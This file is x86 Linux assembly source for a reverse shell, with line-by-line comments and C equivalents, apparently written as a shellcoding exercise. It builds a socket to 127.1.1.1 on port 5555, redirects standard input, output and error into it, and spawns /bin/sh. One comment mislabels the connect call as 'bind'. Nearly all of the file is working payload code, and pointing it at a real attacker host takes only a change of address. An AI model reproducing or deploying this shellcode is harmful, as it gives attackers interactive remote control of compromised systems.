;ASM (x86) reverse shell for 127.1.1.1 on port 5555
global _start

_start:
    ;This part initialize the registers and the stack
    mov ebp, esp        ;Initialize the stack frame

    xor eax, eax        ;Initialize eax to NULL
    xor ebx, ebx        ;Initialize ebx to NULL
    xor ecx, ecx        ;Initialize ecx to NULL
    xor edx, edx        ;Initialize edx to NULL

    ;This part push the structure "sockaddr_in" on the stack
    ;C code representation:
    ;   struct sockaddr_in struct
    ;   addr.sin_family = AF_INET;
    ;   addr.sin_port = htons(5555);
    ;   addr.sin_addr.s_addr = inet_addr("127.1.1.1");
    push eax
    push eax            ;Fill the end of the structure with 2 NULL Bytes
    push 0x0101017f     ;Initialize the variable "addr.sin_addr.s_addr" to connect to 127.1.1.1  
    push word 0xb315    ;Initialize the variable "addr.sin_port" to connect on port 5555 
    push word 0x02      ;Initialize the variable "addr.sin_family" to IPV4 (AF_INET)


    ;This part initialize and call the "socket" systemcall
    mov ax, 0x167       ;Move the "socket" systemcall number inside ax
    mov bl, 0x02        ;Move the "AF_INET" value (which means IPV4) inside bl
    mov cl, 0x01        ;Move the "SOCK_STREAM" value (which means TCP) inside cl

    ;C code representation of the systemcall:
    ; --> s = socket(AF_INET, SOCK_STREAM, 0);
    int 0x80            ;Execute the systemcall
    mov esi, eax        ;Move the return value from the "socket" systemcall into esi


    ;This part initialize and call the "bind" systemcall
    xor eax, eax        ;Initialize eax to NULL
    mov ax, 0x16a       ;Move the "connect" systemcall number inside ax
    mov ebx, esi        ;Move the return value of "socket" inside ebx
    mov ecx, esp        ;Point ecx to the structure
    ;Get the structure size
    mov edx, ebp        
    sub edx, esp        ;Use the stack pointers (esp and ebp to calculate the size of the structure)
    
    ;C code representation of the systemcall:
    ; --> connect(s, (struct sockaddr *)&sa, sizeof(sa));
    int 0x80            ;Execute systemcall


    ;This part redirect the STDIN, STDOUT and STDERR into the socket
    xor ecx, ecx        ;Initialize ecx to NULL
    mov cl, 3           ;Initialize cl to 3
    boucle:
        xor eax, eax    ;Initialize eax to NULL
        mov al, 0x3f    ;Move the "dup2" systemcall number inside al
        mov ebx, esi    ;Move the return value of "socket" in ebx
        dec cl          ;Decrement cl to 1

        ;C code representation of the systemcall:
        ;for (int i = 0; i < 3; i++)
        ;{
        ;    dup2(s, i);
        ;}
        int 0x80        ;Execute systemcall
        inc cl          ;Increment cl to 1
        loop boucle     ;Loop three times until cl is equal to 0


    ;This part initialize and call the "execve" systemcall
    xor eax, eax        ;Initialize eax to NULL
    push eax            ;Push a NULL Byte on the stack
    push 0x68732f2f     
    push 0x6e69622f     ;push "/bin//sh" on the stack
    mov ebx, esp        ;Initialize ebx to "/bin//sh%00"
    xor ecx, ecx        ;Initialize ecx to NULL
    xor edx, edx        ;Initialize edx to NULL
    mov al, 0xb         ;Move the "execve" systemcall number inside al
    ;C code representation of the systemcall:
    ; --> execve("/bin/sh", NULL, NULL);
    int 0x80            ;Execute systemcall
